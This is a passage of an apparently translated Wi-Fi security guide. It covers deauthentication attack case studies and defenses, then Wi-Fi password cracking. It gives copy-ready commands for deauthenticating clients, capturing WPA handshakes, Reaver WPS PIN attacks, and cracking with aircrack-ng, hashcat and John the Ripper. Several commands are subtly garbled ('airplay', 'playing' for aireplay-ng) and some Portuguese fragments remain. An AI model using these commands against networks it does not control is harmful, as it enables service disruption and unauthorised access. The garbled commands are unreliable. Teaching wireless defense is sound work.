    # Firmware Update


    Keeping the AP''s firmware up to date is crucial to protect against known vulnerabilities.


    - Regular Updates: Regularly check the manufacturer''s website for firmware updates
    and apply them as needed.


    # Case studies


    Studying real cases of deauthentication attacks can provide valuable insights
    into how these attacks are carried out and how defenses can be improved.


    ## Case 1: Deauthentication Attack in a Corporate Environment


    Context: A company detected frequent interruptions in Wi-Fi connectivity, affecting
    employee productivity.


    **Attack Execution**: The attacker used `airplay-ng` to send deauthentication
    packets to devices connected to the company''s main `AP`. This forced devices
    to disconnect repeatedly, causing outages.


    **Detection**: The attack was detected using `Kismet`, which alerted network administrators
    to the deauthentication activity.


    **Mitigation**: The company has implemented the following measures:

    - Updated the APs firmware.

    - Configured `WPA3` with `SAE` for more secure authentication.

    - Implemented an `IDS` system to monitor deauthentication packets.

    - Segmented the network using `VLANs` to isolate critical devices.


    ## Case 2: Deauthentication Attack on a Home Network


    Context: A home user reported that his Wi-Fi network was constantly disconnecting
    his devices.


    **Attack Execution**: The attacker, a malicious neighbor, used `mdk3` to send
    deauthentication packets to force user devices to disconnect.


    **Detection**: The user used `Wireshark` to capture packets and identified the
    presence of deauthentication packets.


    **Mitigation**: The user has applied the following measures:

    - Changed the Wi-Fi password to a strong password.

    - Disabled `WPS` on the router.

    - Updated the router''s firmware to the latest version.

    - Implemented `MAC` filtering to allow only authorized devices.


    ## Case 3: Deauthentication Attack on a Public Network


    Context: A cafe offered free Wi-Fi to customers but faced frequent disconnection
    issues.


    **Attack Execution**: The attacker used a custom `Python` script with `Scapy`
    to send deauthentication packets, disrupting Wi-Fi service.


    **Detection**: The network administrator used real-time monitoring tools to identify
    spikes in deauthentication packets.


    **Mitigation**: The following measures have been taken:

    - `WPA3` implementation with `SAE`.

    - Updating `APs` to models with better security support.

    - Use of `IDS` for continuous monitoring and alerts of suspicious activity.


    # Practical Examples of Execution and Defense


    ## Attack Execution with Aireplay-ng`


    Put the Interface in Monitor Mode:


    ```bash

    sudo airmon-ng start wlan0

    ```


    Capture Packets to Identify Clients and AP:


    ```bash

    sudo airodump wlan0mon

    ```


    Perform the Deauthentication Attack: To deauthenticate a specific client:


    ```bash

    sudo airplay --deauth 0 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon

    ```


    To deauthenticate all clients:


    ```bash

    sudo playing --deauth 0 -a 00:11:22:33:44:55 wlan0mon

    ```


    ## Implementation of Defenses


    1. **Configure WPA3 on the Router**: Access the router settings and change the
    network security to `WPA3`. If `WPA3` is not available, use `WPA2` with a strong,
    unique password.


    **Monitoring with Snort**: Install and configure `Snort` to monitor deauthentication
    packets:


    ```bash

    sudo apt install snort

    ```


    2. Add deauthentication packet detection rules in the `Snort` configuration file.


    3. **Disabling WPS**: Access the router''s administration interface and disable
    the `WPS` functionality to prevent related attacks.

    4. **MAC Filtering**: Configure an access control list (`ACL`) on the router to
    allow only authorized devices.

    5. **Firmware Updates**: Regularly check your router manufacturer''s website for
    firmware updates and apply them as needed.


    Deauthentication attacks are a common and effective technique used to disrupt
    the connectivity of Wi-Fi networks. Using tools such as `airplay-ng`, `MDK3` and
    `Scapy`, these attacks can be carried out relatively easily. However, there are
    several mitigation and defense strategies, including the use of `WPA3`, monitoring
    and detection, packet filtering, network segmentation, and firmware updating.
    Real-world case studies illustrate the effectiveness of these strategies in protecting
    against deauthentication attacks, highlighting the importance of a multi-pronged
    approach to ensuring the security of Wi-Fi networks.


    # Chapter 5: Wi-Fi Password Cracking


    # Wi-Fi Password Attack Methods


    The security of Wi-Fi networks depends heavily on the strength of the passwords
    used to protect access. Cracking these passwords could allow an attacker to access
    the network, intercept data, and even compromise connected devices. There are
    several methods used to crack Wi-Fi passwords, each with its own techniques and
    tools.


    # Handshakes Capture


    The first step in many Wi-Fi password attacks is to capture the `WPA/WPA2` handshake.
    This process occurs when a device connects to a Wi-Fi network, allowing the attacker
    to capture the packets necessary to crack the password.


    **Use of Airodump-ng**:


    ```bash

    sudo airodump-ng -c [canal] --bssid [BSSID] -w capture wlan0mon

    ```


    - This command captures the handshake, which is saved to a file `.cap`.


    # Reaver Attack


    `Reaver` is a tool that exploits Wi-Fi Protected Setup (`WPS`) vulnerability to
    recover `WPA/WPA2` password.


    **Use of Reaver**:


    ```bash

    sudo reaver -i wlan0mon -b [BSSID] -vv

    ```


    - This command attempts to guess the `WPS` PIN, which can be used to recover the
    password.


    # Phishing attack


    Phishing is a technique in which the attacker creates a fake login page to capture
    the user''s password. On Wi-Fi networks, this can be done by setting up a fake
    access point that asks for the original network''s password.


    # Password Cracking Tools


    There are several specialized tools for cracking Wi-Fi passwords, each with its
    specific characteristics and uses.


    ## Aircrack-ng`


    `Aircrack-ng` is one of the most popular tools for cracking `WEP` and `WPA/WPA2`
    passwords. It uses dictionary attack and brute force techniques to try to guess
    the password.


    **Installation**:


    ```bash

    sudo apt install aircrack-ng

    ```


    **WPA/WPA2 Password Cracking**:


    ```bash

    sudo aircrack-ng -w wordlist.txt -b [BSSID] capture-01.cap

    ```


    This command uses a dictionary file (`wordlist.txt`) to try to guess the password
    based on the captured handshake.


    ## Hashcat


    `Hashcat` is a powerful password cracking tool that can use the `GPU` to significantly
    increase cracking speed. Supports a wide range of hash algorithms, including `WPA/WPA2`.


    **Installation**:


    ```bash

    sudo apt install hashcat

    ```


    **Basic Use**:


    Converting the handshake `.cap` for format `Hashcat`:


    ```bash

    hcxpcaptool -z capture.hccapx capture-01.cap

    ```


    **Cracking the password**:


    ```bash

    hashcat -m 2500 capture.hccapx wordlist.txt

    ```


    ## John the Ripper


    `John the Ripper` is another password cracking tool that can be used for `WPA/WPA2`.
    Although most commonly used for password hashes, it also supports `WPA/WPA2`.


    **Installation**:


    ```bash

    sudo apt install john

    ```


    **Basic Use**:


    Converting the handshake `.cap` for `John` format:


    ```bash

    hcxpcaptool -o capture.john capture-01.cap

    ```


    **Cracking the password**:


    ```bash

    john --wordlist=wordlist.txt capture.john

    ```


    # Brute Force and Dictionary Attacks


    Brute force and dictionary attacks are two of the most common techniques used
    to crack Wi-Fi passwords.


    ## Brute Force Attacks


    In brute force attacks, the attacker tries every possible combination of characters
    until he finds the correct password. This method is extremely time-consuming and
    resource-intensive, especially for long and complex passwords.


    **Uso com Aircrack-ng**:


    ```bash

    sudo aircrack-ng -a2 -b [BSSID] -w brute-force-list.txt capture-01.cap

    ```


    - Where `brute-force-list.txt` is a file containing all possible combinations
    of passwords.


